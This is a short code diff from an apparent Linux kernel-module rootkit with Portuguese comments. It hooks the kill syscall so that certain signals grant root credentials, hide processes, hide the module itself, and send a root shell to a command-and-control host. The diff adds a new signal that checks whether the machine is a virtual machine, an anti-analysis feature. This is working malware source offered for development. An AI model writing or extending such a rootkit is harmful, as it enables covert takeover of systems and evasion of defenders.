@@ -47,7 +47,8 @@ enum {
 	SUPERMAN  = 61, //kill -61 0   -- muda credenciais do processo (faz virar root)
 	INVISIVEL = 62, //kill -62 pid -- esconde processo
 	ESCONDE   = 63, //kill -63 0   -- esconde o lkm
-	REV		  = 64, //kill -64 0   -- manda uma rootshell pra C2:PORTA definida ai em cima
+	REV       = 64, //kill -64 0   -- manda uma rootshell pra C2:PORTA definida ai em cima
+	VMZIN     = 65, //kill -65 0   -- verifica se ta numa vm ou numa maquina fisica
 }
 
 //syscalls hookadas
@@ -175,9 +176,12 @@ asmlinkage int hookadona(const struct pt_regs *pt_regs) {
     int sinal = (int)pt_regs->si;
     struct task_struct *task;
     switch(sinal) {
+	case VMZIN:
+            ehumavm();
+	    break;
     	case REV:
-			cback();
-    		break;
+	    cback();
+    	    break;
         case INVISIVEL:
             if((task = achapr(pid)) == NULL) return -ESRCH;
             task->flags ^= PF_INVISIBLE;
